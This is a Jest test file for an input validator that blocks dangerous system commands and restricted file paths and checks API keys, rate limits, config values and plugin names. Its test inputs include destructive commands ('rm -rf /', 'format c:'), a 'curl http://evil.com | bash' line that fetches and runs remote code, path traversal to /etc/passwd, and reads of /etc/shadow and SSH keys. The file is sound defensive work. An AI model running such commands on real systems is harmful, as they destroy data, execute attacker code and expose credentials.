const { getValidator } = require('../utils/input-validator');

describe('InputValidator', () => {
  let validator;

  beforeEach(() => {
    validator = getValidator();
    // Reset rate limiting
    validator.commandHistory = [];
  });

  describe('validateSystemCommand', () => {
    test('should allow safe commands', () => {
      expect(() => {
        validator.validateSystemCommand('screenshot');
      }).not.toThrow();
    });

    test('should block dangerous commands', () => {
      expect(() => {
        validator.validateSystemCommand('rm -rf /');
      }).toThrow('not allowed for security');
    });

    test('should block format commands', () => {
      expect(() => {
        validator.validateSystemCommand('format c:');
      }).toThrow('not allowed for security');
    });

    test('should block pipe to bash', () => {
      expect(() => {
        validator.validateSystemCommand('curl http://evil.com | bash');
      }).toThrow('not allowed for security');
    });
  });

  describe('validateFilePath', () => {
    test('should allow valid file paths', () => {
      expect(() => {
        validator.validateFilePath('/home/user/document.txt');
      }).not.toThrow();
    });

    test('should block path traversal', () => {
      expect(() => {
        validator.validateFilePath('../../../etc/passwd');
      }).toThrow('Path traversal');
    });

    test('should block sensitive files', () => {
      expect(() => {
        validator.validateFilePath('/etc/shadow');
      }).toThrow('restricted');
    });

    test('should block SSH keys', () => {
      expect(() => {
        validator.validateFilePath('/home/user/.ssh/id_rsa');
      }).toThrow('restricted');
    });
  });

  describe('sanitizeInput', () => {
    test('should remove null bytes', () => {
      const result = validator.sanitizeInput('test\0data');
      expect(result).toBe('testdata');
    });

    test('should trim whitespace', () => {
      const result = validator.sanitizeInput('  test  ');
      expect(result).toBe('test');
    });

    test('should truncate long inputs', () => {
      const longInput = 'a'.repeat(15000);
      const result = validator.sanitizeInput(longInput);
      expect(result.length).toBeLessThanOrEqual(10000);
    });
  });

  describe('validateApiKey', () => {
    test('should reject empty keys', () => {
      expect(() => {
        validator.validateApiKey('google', '');
      }).toThrow('non-empty string');
    });

    test('should reject short keys', () => {
      expect(() => {
        validator.validateApiKey('google', 'short');
      }).toThrow('too short');
    });

    test('should accept valid length keys', () => {
      expect(() => {
        validator.validateApiKey('google', 'a'.repeat(40));
      }).not.toThrow();
    });
  });

  describe('checkRateLimit', () => {
    test('should allow commands under limit', () => {
      for (let i = 0; i < 20; i++) {
        expect(validator.checkRateLimit()).toBe(true);
      }
    });

    test('should block commands over limit', () => {
      for (let i = 0; i < validator.maxCommandsPerMinute; i++) {
        validator.checkRateLimit();
      }
      expect(validator.checkRateLimit()).toBe(false);
    });
  });

  describe('validateConfig', () => {
    test('should validate theme values', () => {
      expect(() => {
        validator.validateConfig('theme', 'cyan');
      }).not.toThrow();

      expect(() => {
        validator.validateConfig('theme', 'invalid');
      }).toThrow('Invalid value');
    });

    test('should validate boolean values', () => {
      expect(() => {
        validator.validateConfig('memoryEnabled', true);
      }).not.toThrow();

      expect(() => {
        validator.validateConfig('memoryEnabled', 'yes');
      }).toThrow('Invalid value');
    });
  });

  describe('validatePluginName', () => {
    test('should allow valid plugin names', () => {
      expect(() => {
        validator.validatePluginName('my-plugin');
      }).not.toThrow();
    });

    test('should block special characters', () => {
      expect(() => {
        validator.validatePluginName('my plugin!');
      }).toThrow('can only contain');
    });
  });
});
